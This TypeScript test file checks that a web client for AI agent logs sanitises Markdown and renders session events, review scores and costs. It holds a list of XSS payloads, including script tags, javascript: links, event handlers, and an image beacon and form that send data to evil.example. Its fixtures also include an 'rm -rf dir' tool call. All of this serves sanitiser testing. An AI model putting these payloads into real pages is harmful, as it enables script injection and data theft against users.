import assert from "node:assert/strict";
import { test } from "node:test";
import type { Event } from "../app/model.ts";
import { dollarsToNanos, formatDollars, formatTokens, inputText, nanosToDollars } from "../web/src/format.ts";
import {
  errorDetail, groupDeltas, mergeEvents, parseSegment, resolvedLabel, reviewedLabel, reviewedTitle, reviewNote, scoreDigits, sortedEvents, toolStatus, unsentMessages, viewItems,
  type Item,
} from "../web/src/log.ts";
import { anchorTarget, markdown } from "../web/src/markdown.ts";

// The client renders text through Solid, which escapes it; Markdown is the one path to innerHTML.

/** Markup untrusted text must never produce: script, handlers, styles, forms, embedded or fetched resources. */
const FORBIDDEN = /<(?:script|style|iframe|object|embed|img|video|audio|source|form|link|meta|svg|math)\b|\son[a-z]+=|\sstyle=|\ssrc=|href="(?!https?:|mailto:|#)|<input(?![^>]*type="checkbox")/i;

const HOSTILE = [
  "<script>alert(1)</script>",
  "\"><img src=x onerror=alert(1)>",
  "[click](javascript:alert(1))",
  "[click](JaVaScRiPt:alert(1))",
  "[click](https://example.com\" onclick=\"alert(1))",
  "[click](https://example.com/\"onmouseover=\"alert(1))",
  "`</code><script>alert(1)</script>`",
  "```\n</pre><script>alert(1)</script>\n```",
  "```js\" onclick=\"x\n1\n```",
  "| <b>head</b> | x |\n|---|---|\n| <img src=x> | y |",
  "**<b>bold</b>** _<i>em</i>_ ~~<s>x</s>~~",
  "- <li>item</li>\n  - [ ] <input>\n1. <ol>",
  "> <blockquote>\n> quoted",
  "# <h1>heading</h1>",
  "https://example.com/<script>alert(1)</script>",
  "<https://example.com>",
  "&lt;script&gt; already escaped",
  "nul \u0000 0 \u0000 byte",
  "[a `code` label](https://example.com/?a=1&b=\"2\")",
  "*unclosed **nesting* mess** ___ *** ~~",
  "[x](data:text/html,<script>alert(1)</script>)",
  "<a href=\"javascript:alert(1)\">x</a> <div style=\"position:fixed\" onclick=\"x()\">y</div>",
  "<iframe src=\"https://evil.example\"></iframe><form action=\"https://evil.example\"><input name=p></form>",
  "<svg><script>alert(1)</script></svg><math><mi>x</mi></math>",
  "![leak](https://evil.example/?q=secret) <img src=\"https://evil.example/pixel\">",
];

test("model text never becomes active markup", () => {
  for (const source of HOSTILE) {
    const markup = markdown(source);
    // Text cannot hold a raw "<" (the serializer escapes it), so this is every tag and nothing else.
    const tags = (markup.match(/<[^>]*>/g) ?? []).join("");
    assert.doesNotMatch(tags, FORBIDDEN, `${JSON.stringify(markup)} from ${JSON.stringify(source)}`);
  }
  assert.equal(markdown("<b>hi</b> & 'you'"), "<p><b>hi</b> &#x26; 'you'</p>");
  assert.ok(!markdown("[x](javascript:alert(1))").includes("href"));
  assert.ok(!markdown("[x](data:text/html,hi)").includes("href"));
});

test("images become links, so nothing is fetched on the model's say-so", () => {
  assert.equal(markdown("![cat](https://example.com/cat.png)"), '<p><a href="https://example.com/cat.png" target="_blank" rel="noopener noreferrer">cat</a></p>');
});

test("Markdown renders GitHub's syntax", () => {
  const md = markdown;
  assert.equal(md("# Title\n\nSome **bold**, *italic*, `code`, ~~gone~~ and snake_case_name. :tada:"),
    "<h3>Title</h3>\n<p>Some <strong>bold</strong>, <em>italic</em>, <code>code</code>, <del>gone</del> and snake_case_name. 🎉</p>");
  assert.match(md("- [x] done\n- [ ] todo"), /<li class="task-list-item"><input type="checkbox" checked disabled> done<\/li>/);
  assert.match(md("| a | b |\n|:--|--:|\n| 1 | 2 |"), /<div class="table-wrap"><table><thead><tr><th align="left">a<\/th><th align="right">b<\/th>/);
  assert.match(md("Visit https://example.com/x."), /<a href="https:\/\/example.com\/x" target="_blank" rel="noopener noreferrer">https:\/\/example.com\/x<\/a>\./);
  assert.match(md("```ts\nconst a = 1 < 2;\n```"),
    /<div class="codeblock"><div class="codeblock-bar"><span>ts<\/span><button type="button" class="copy" data-action="copy">Copy<\/button><\/div><pre><code class="language-ts">const a = 1 &#x3C; 2;/);
  assert.match(md("```\nstill streaming"), /<pre><code>still streaming\n<\/code><\/pre>/);
  assert.match(md("```mermaid\ngraph TD; A-->B\n```"), /<div class="codeblock diagram-source">[\s\S]*<code class="language-mermaid">graph TD; A-->B/);
  // The view typesets math, highlights code and draws diagrams from these.
  assert.equal(md("Inline $e^{i\\pi}$ and\n\n$$\nx^2\n$$"), '<p>Inline <code class="language-math math-inline">e^{i\\pi}</code> and</p>\n<pre><code class="language-math math-display">x^2</code></pre>');
  assert.match(md("> [!WARNING]\n> Careful."), /<div class="markdown-alert markdown-alert-warning"><p class="markdown-alert-title">[\s\S]*Warning<\/p>\n<p>Careful.<\/p>/);
  assert.match(md("<details><summary>More</summary>\n\n*hidden*\n\n</details> <kbd>Ctrl</kbd>"), /<details><summary>More<\/summary>\n<p><em>hidden<\/em><\/p>\n<\/details> <kbd>Ctrl<\/kbd>/);
  // Ids take GitHub's prefix; the view resolves the bare names in links (anchorTarget).
  const footnote = md("Claim[^1].\n\n[^1]: Source.");
  assert.match(footnote, /<a href="#fn-1" id="user-content-fnref-1"/);
  assert.match(footnote, /<li id="user-content-fn-1">/);
  assert.equal(anchorTarget("#fn-1"), "user-content-fn-1");
});

const at = 1_700_000_000_000;
const event = (seq: number, body: Event["body"]): Event => ({ session: "s1", seq, at: at + seq, body });
const call = (id: string, state: "reviewing" | "awaiting" | "running" | "done", extra: { name?: string; approval?: "permission" | "elicitation" } = {}) =>
  ({ id, name: extra.name ?? "bash", input: {}, state, approval: extra.approval ?? null, prompt: null, job: null, child: null });
const kinds = (items: Item[]) => items.map((item) => item.kind);
const only = <K extends Item["kind"]>(item: Item | undefined, kind: K) => {
  assert.equal(item?.kind, kind);
  return item as Extract<Item, { kind: K }>;
};

test("tool results fold into their calls and prompts show only while awaiting", () => {
  const events = [
    event(1, { type: "user", message: "m1", text: "hi", attachments: [], author: "ann" }),
    event(2, { type: "status", status: "working" }),
    event(3, { type: "assistant", blocks: [
      { type: "thinking", thinking: "hmm", signature: "sig" },
      { type: "text", text: "Running **it**" },
      { type: "tool_call", id: "c1", name: "bash", input: { command: "rm -rf dir" } },
      { type: "tool_call", id: "c2", name: "read_file", input: { path: "a.txt" } },
    ], model: "claude-opus-5", stopReason: "tool_use", usage: null, costNanos: 0, interrupted: false }),
    event(4, { type: "tool_awaiting", call: "c1", kind: "permission", prompt: "rm -rf dir" }),
    event(5, { type: "tool_result", call: "c2", content: "secret", isError: true, blob: null }),
    event(6, { type: "status", status: "waiting_on_user" }),
  ];
  const items = viewItems(events, { c1: call("c1", "awaiting", { approval: "permission" }), c2: call("c2", "done", { name: "read_file" }) });
  assert.deepEqual(kinds(items), ["user", "assistant", "awaiting"]);
  const assistant = only(items[1], "assistant");
  assert.equal(assistant.results.c1, null);
  assert.equal(assistant.results.c2?.content, "secret");
  assert.equal(toolStatus(assistant.results.c1, assistant.states.c1), "awaiting");
  assert.equal(toolStatus(assistant.results.c2, assistant.states.c2), "error");
  const prompt = only(items[2], "awaiting");
  assert.equal(prompt.awaiting, true);
  assert.equal(prompt.call?.name, "bash");
  assert.equal(inputText(prompt.call?.input), "rm -rf dir");

  const resolved = [...events, event(7, { type: "tool_resolved", call: "c1", resolution: "denied" }), event(8, { type: "tool_result", call: "c1", content: "denied", isError: true, blob: null }), event(9, { type: "status", status: "idle" })];
  const after = viewItems(resolved, {});
  assert.deepEqual(kinds(after), ["user", "assistant", "awaiting", "status"]);
  assert.deepEqual(after.map((item) => item.key), ["e1", "e3", "e4", "e9"], "items keep their keys as the log grows");
  assert.equal(only(after[1], "assistant").results.c1?.content, "denied");
  const card = only(after[2], "awaiting");
  assert.equal(card.awaiting, false);
  assert.equal(resolvedLabel(card), "Permission for bash: denied");
});

test("auto-approved calls get a marker, and prompts say why the reviewer left them to the user", () => {
  const events = [
    event(1, { type: "assistant", blocks: [
      { type: "tool_call", id: "c1", name: "bash", input: { command: "npm test" } },
      { type: "tool_call", id: "c2", name: "bash", input: { command: "git push" } },
      { type: "tool_call", id: "c3", name: "write_file", input: { path: "a", content: "b" } },
    ], model: "m", stopReason: "tool_use", usage: null, costNanos: 0, interrupted: false }),
    event(2, { type: "tool_reviewed", call: "c1", approved: true, reviewer: "jev-2026-09-20", scores: { requested: 0.97, safe: 0.951 }, note: null }),
    event(3, { type: "tool_reviewed", call: "c2", approved: false, reviewer: "jev-2026-09-20", scores: { requested: 0.97, safe: 0.749 }, note: null, threshold: 0.75 }),
    event(4, { type: "tool_awaiting", call: "c2", kind: "permission", prompt: "Run: git push" }),
  ];
  const items = viewItems(events, { c1: call("c1", "running"), c2: call("c2", "awaiting", { approval: "permission" }), c3: call("c3", "reviewing") });
  assert.deepEqual(kinds(items), ["assistant", "reviewed", "awaiting"]);
  const assistant = only(items[0], "assistant");
  assert.equal(toolStatus(assistant.results.c3, assistant.states.c3), "reviewing");
  const marker = only(items[1], "reviewed");
  assert.equal(reviewedLabel(marker), "Auto-approved bash npm test");
  assert.equal(reviewedTitle(marker.event.body), "Reviewed by jev-2026-09-20: requested 0.97 · safe 0.951");
  assert.equal(reviewNote(only(items[2], "awaiting").review), "Not auto-approved: jev-2026-09-20 was not confident enough (requested 0.97 · safe 0.749, needs 0.75)", "a near miss shows as one");
  assert.deepEqual([1, 0, 0.9, 0.7555, 1e-7].map(scoreDigits), ["1.00", "0.00", "0.90", "0.7555", "0.0000001"]);

  const failed = [events[0]!, event(5, { type: "tool_reviewed", call: "c3", approved: false, reviewer: null, scores: {}, note: "The review took too long." }), event(6, { type: "tool_awaiting", call: "c3", kind: "permission", prompt: "Write 1 characters to a" })];
  assert.equal(reviewNote(only(viewItems(failed, { c3: call("c3", "awaiting") }).at(-1), "awaiting").review), "Not auto-approved: The review took too long.");
});

test("an awaiting call outside the loaded window still gets a prompt", () => {
  const [item] = viewItems([], { q: { ...call("q", "awaiting", { name: "ask_user", approval: "elicitation" }), input: { question: "Which?" } } });
  const prompt = only(item, "awaiting");
  assert.equal(prompt.key, "await:q");
  assert.equal(prompt.awaiting, true);
  assert.equal(prompt.event.body.kind, "elicitation");
});

test("subagents link to their session and other events show", () => {
  const events = [
    event(1, { type: "assistant", blocks: [{ type: "tool_call", id: "t1", name: "subagent", input: { description: "Scan repo", prompt: "p" } }], model: "m", stopReason: "tool_use", usage: null, costNanos: 0, interrupted: false }),
    event(2, { type: "subagent", call: "t1", session: "s1.t1" }),
    event(3, { type: "compact", summary: "We did *things*" }),
    event(4, { type: "error", code: "OVERLOADED", message: "Busy", retryInMs: 2000 }),
    event(5, { type: "interrupted" }),
    event(6, { type: "background_result", call: "t1", content: "done", isError: false, blob: "sha256/" + "b".repeat(64) }),
    event(7, { type: "assistant", blocks: [], model: "m", stopReason: "refusal", usage: null, costNanos: 0, interrupted: false }),
  ];
  const items = viewItems(events);
  assert.deepEqual(kinds(items), ["assistant", "subagent", "compact", "error", "interrupted", "background"]);
  assert.equal(only(items[1], "subagent").call?.name, "subagent");
  assert.equal(errorDetail(only(items[3], "error").event.body), "OVERLOADED · retrying in 2s");
  assert.equal(only(items[5], "background").call?.id, "t1");
});

test("streamed deltas group by block", () => {
  const blocks = groupDeltas([
    { index: 1, type: "text", text: "Hel" },
    { index: 0, type: "thinking", text: "consider" },
    { index: 1, type: "text", text: "lo <b>" },
    { index: 2, type: "tool_call", name: "bash", text: "{\"command\":" },
  ]);
  assert.deepEqual(blocks.map((block) => [block.type, block.text, block.name]), [["thinking", "consider", null], ["text", "Hello <b>", null], ["tool_call", "{\"command\":", "bash"]]);
});

test("queued and pending messages show until they reach the log", () => {
  const unsent = unsentMessages(
    [{ id: "q", text: "next", steer: true, at, attachments: [], author: null, result: null }, { id: "r", text: "", steer: true, at, attachments: [], author: null, result: { call: "c", content: "", isError: false, blob: null } }],
    [{ id: "p", text: "sending", attachments: [] }],
  );
  assert.deepEqual(unsent, [{ text: "next", tag: "Steer · next step", files: 0 }, { text: "sending", tag: "Sending…", files: 0 }]);
});

test("money and segments", () => {
  assert.equal(formatDollars(12_345_000_000), "$12.35");
  assert.equal(formatDollars(1_000_000), "$0.0010");
  assert.equal(dollarsToNanos("$1,250.50"), 1_250_500_000_000);
  assert.equal(dollarsToNanos(" "), null);
  assert.throws(() => dollarsToNanos("-3"));
  assert.equal(nanosToDollars(dollarsToNanos("19.99")), "19.99");
  assert.equal(formatTokens(1_234_567), "1.2M");
  const known = new Map<number, Event>();
  assert.equal(mergeEvents(known, parseSegment(`${JSON.stringify(event(2, { type: "interrupted" }))}\n${JSON.stringify(event(1, { type: "interrupted" }))}\n`)), 2);
  assert.equal(mergeEvents(known, [event(2, { type: "interrupted" })]), 0);
  assert.deepEqual(sortedEvents(known).map((each) => each.seq), [1, 2]);
});
